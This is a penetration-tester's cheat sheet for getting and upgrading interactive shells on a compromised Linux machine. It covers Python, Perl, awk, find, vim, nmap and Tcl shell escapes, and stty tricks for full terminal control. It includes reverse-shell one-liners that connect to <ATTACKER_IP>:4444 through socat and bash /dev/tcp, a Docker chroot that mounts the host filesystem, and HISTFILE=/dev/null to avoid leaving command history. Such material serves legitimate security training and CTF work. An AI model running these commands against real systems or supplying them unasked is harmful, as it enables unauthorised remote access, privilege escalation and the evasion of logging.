
- [ ] [[#Python]]
- [ ] [[#Socat]]
- [ ] [[#Script Method (if available on the system)|Script]]
- [ ] [[#sh]]
- [ ] [[#Perl]]
- [ ] [[#Ruby]]
- [ ] [[#Java]]
- [ ] [[#Lua]]
- [ ] [[#Awk]]
- [ ] [[#Find]]
- [ ] [[#With Tcl]]
- [ ] [[#Script Method (if available on the system)]]
- [ ] [[#/dev/tcp and Bash (interactive reverse shell)]]
- [ ] [[#Shell Upgrade with System Commands (stty and export)]]
- [ ] [[#With vi or vim (command mode)]]
- [ ] [[#With nmap (if it has scripting with --interactive)]]
- [ ] [[#With Docker / Chroot / chsh if you have permissions]]
- [ ] [[#Useful Tips]]

---

## Python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'

python -c 'import os; os.system("/bin/bash")'
```

### Ensuring Terminal Configuration

```bash
echo $TERM # Verify terminal type
export TERM=xterm # Set terminal type if needed
export SHELL=/bin/bash # Force bash if possible
```

### Regaining Full Terminal Control

1. Suspend with `Ctrl + Z`
2. On the attacker host:

```bash
stty raw -echo; fg reset xterm
```

### Adjusting Window Size (prevents errors when using programs like `nano`, `htop`, etc.)

1. On the attacker host:

```bash
stty size # Example output: 30 127
```

2. On the remote shell:

```bash
stty rows 30 columns 127
```

---

## sh

```sh
/bin/sh -i
```

---
## [Socat](https://github.com/andrew-d/static-binaries)

On attacker (listener):

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On victim (reverse shell):

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<ATTACKER_IP>:4444
```

---

## Script Method (if available on the system)

```bash
script /dev/null -c bash
```

---

## /dev/tcp and Bash (interactive reverse shell)

```bash
bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
```

Once connected, you can upgrade the shell with stty (explained below).

---

## Shell Upgrade with System Commands (stty and export)

Once you use any of the above methods (like` python -c 'pty.spawn(...)'`), you can further improve it with:

```bash
CTRL+Z   # Pause the shell and return to your local terminal
stty raw -echo; fg
```

Then, type:

```bash
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <num>    # Adjust size if needed
```

---

## Perl

```bash
perl -e 'exec "/bin/bash";'
```

Or with pseudo-terminal:

```bash
perl -e 'use POSIX; POSIX::setsid(); exec "/bin/bash";'
```

---

## Ruby

```shell
exec "/bin/sh"
```

---

## Java

If Runtime.exec() is accessible:

```java
Runtime.getRuntime().exec("/bin/bash");
```

(Generally not very useful manually, but useful in Java app exploitation).

---

## Lua

```bash
lua -e "os.execute('/bin/bash')"
```

---

## Awk

```bash
awk 'BEGIN {system("/bin/bash")}'
```

---

## Find


```shell
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

find . -exec /bin/sh \; -quit
```

---

## With Tcl

```bash
tclsh
exec /bin/bash
```

---

## With vi or vim (command mode)

```bash
vim
:!bash
```

Or:

```bash
vim -c ':!/bash/sh'
```

```sh
vim
:set shell=/bin/sh
:shell
### vim escape
```

---

## With nmap (if it has scripting with --interactive)

```bash
nmap --interactive
!sh
```

---

## With Docker / Chroot / chsh if you have permissions

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

Or if you can change your shell:

```bash
chsh -s /bin/bash
```

---
## Useful Tips

If you have a shell without colors or history, export:

```bash
export TERM=xterm-256color
export HISTFILE=/dev/null
```

To check if a TTY is assigned:

```bash
tty
```

---